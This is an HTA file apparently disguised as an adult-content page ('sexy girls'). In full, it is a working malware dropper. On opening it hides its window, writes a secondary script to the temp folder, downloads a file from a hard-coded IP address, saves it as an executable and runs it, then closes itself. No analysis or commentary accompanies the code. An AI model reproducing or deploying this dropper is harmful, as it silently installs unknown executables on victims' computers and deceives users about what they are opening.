<html>
<head>
<script language="javascript">
var fso = new ActiveXObject("Scripting.FileSystemObject");
var tfolder = fso.GetSpecialFolder(2);
var filepath = tfolder + "\\tmk.js";
var a = fso.CreateTextFile(filepath, true);
a.WriteLine('var url = "http://69.31.86.252/xltmk.dat";');
a.WriteLine('var fso = new ActiveXObject("Scripting.FileSystemObject");');
a.WriteLine('var tfolder = fso.GetSpecialFolder(2);');
a.WriteLine('var filepath = tfolder + "\\\\tmk1803.exe";');

a.WriteLine('var x = new ActiveXObject("Microsoft.XMLHTTP");');
a.WriteLine('x.Open("GET", url ,0);');
a.WriteLine('x.Send();');

a.WriteLine('var s = new ActiveXObject("ADODB.Stream");');
a.WriteLine('s.Mode = 3;');
a.WriteLine('s.Type = 1;');
a.WriteLine('s.Open();');
a.WriteLine('s.Write(x.responseBody);');
a.WriteLine('s.SaveToFile(filepath,2);');

a.WriteLine('var Shell = new ActiveXObject("WScript.Shell");');
a.WriteLine('Shell.Run(filepath);');

a.Close();

var Shell = new ActiveXObject("WScript.Shell");
Shell.Run(filepath);
</script>
<HTA:APPLICATION WINDOWSTATE='minimize' SHOWINTASKBAR='no' />
<title>sexy girls</title>
</head>
<body onload='window.close()'>

</body>
</html> 